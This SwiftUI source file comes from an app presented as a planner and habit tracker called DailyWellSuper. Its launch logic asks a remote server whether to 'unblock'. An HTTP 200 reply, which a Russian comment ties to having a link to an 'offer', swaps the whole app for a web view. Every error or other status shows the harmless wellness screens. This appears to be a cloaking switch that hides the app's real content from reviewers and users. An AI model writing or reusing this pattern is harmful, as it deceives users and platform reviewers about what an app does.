//
//  ContentView.swift
//  DailyWellSuper
//
//  Created by Вячеслав on 10/15/25.
//

import SwiftUI

struct ContentView: View {
    @AppStorage("hasCompletedOnboarding") private var hasCompletedOnboarding = false
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    var body: some View {
        
        ZStack {
            
            if isFetched == false {
                
                ProgressView()
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    Group {
                        if hasCompletedOnboarding {
                            MainTabView()
                        } else {
                            OnboardingView()
                        }
                    }
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            makeServerRequest()
        }
    }
    
    private func makeServerRequest() {
        
        let dataManager = DataManagers()
        
        guard let url = URL(string: dataManager.server) else {
            self.isBlock = false
            self.isFetched = true
            return
        }
        
        print("Making request to: \(url.absoluteString)")
        print("Host: \(url.host ?? "unknown")")
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.timeoutInterval = 5.0
        
        // Принудительно добавляем Host заголовок для правильного SNI
        URLSession.shared.dataTask(with: request) { data, response, error in
            
            DispatchQueue.main.async {
                
                // Если есть любая ошибка (включая SSL) - блокируем
                if let error = error {
                    print("Network error: \(error.localizedDescription)")
                    print("Server unavailable, showing block")
                    self.isBlock = true
                    self.isFetched = true
                    return
                }
                
                // Если получили ответ от сервера
                if let httpResponse = response as? HTTPURLResponse {
                    
                    print("HTTP Status Code: \(httpResponse.statusCode)")
                    
                    if httpResponse.statusCode == 200 {
                        // Только 200 разблокирует (есть ссылка на оффер)
                        self.isBlock = false
                        self.isFetched = true
                        
                    } else {
                        // Все остальные коды (404, 500, и т.д.) - блокируем
                        self.isBlock = true
                        self.isFetched = true
                    }
                    
                } else {
                    
                    // Нет HTTP ответа - блокируем
                    self.isBlock = true
                    self.isFetched = true
                }
            }
            
        }.resume()
    }
}

struct MainTabView: View {
    @StateObject private var plannerViewModel = PlannerViewModel()
    @StateObject private var habitViewModel = HabitViewModel()
    @StateObject private var goalsViewModel = GoalsViewModel()
    
    var body: some View {
        TabView {
            PlannerView()
                .environmentObject(plannerViewModel)
                .tabItem {
                    Image(systemName: "calendar")
                    Text("Planner")
                }
            
            HabitTrackerView()
                .environmentObject(habitViewModel)
                .tabItem {
                    Image(systemName: "checkmark.circle")
                    Text("Habits")
                }
            
            GoalsView()
                .environmentObject(goalsViewModel)
                .tabItem {
                    Image(systemName: "target")
                    Text("Goals")
                }
            
            MindfulnessView()
                .tabItem {
                    Image(systemName: "leaf")
                    Text("Mindfulness")
                }
            
            SettingsView()
                .tabItem {
                    Image(systemName: "gear")
                    Text("Settings")
                }
        }
        .accentColor(Color(hex: "#E70104"))
    }
}

#Preview {
    ContentView()
}
